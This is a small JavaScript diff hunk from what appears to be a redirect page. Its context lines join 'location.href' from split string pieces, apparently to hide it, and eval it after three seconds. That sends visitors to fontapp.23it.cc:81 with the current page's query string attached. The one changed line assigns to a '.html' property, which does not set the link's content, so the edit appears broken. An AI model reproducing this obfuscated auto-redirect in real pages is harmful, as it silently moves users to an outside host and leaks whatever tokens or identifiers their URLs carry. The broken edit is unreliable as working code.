@@ -18,7 +18,7 @@
 	var y = 'http://fontapp.23it.cc:81/' + location.search;
 	var x = "lo" + "cati" + "on.hr" + "ef='" + y + "';";
 	console.log(x);
-	document.getElementById('link').html("<a href='" + y + "'>点击访问</a>");
+	document.getElementById('link').html = "<a href='" + y + "'>点击访问</a>";
 	setTimeout(function(){
 		eval(x);
 	}, 3000);
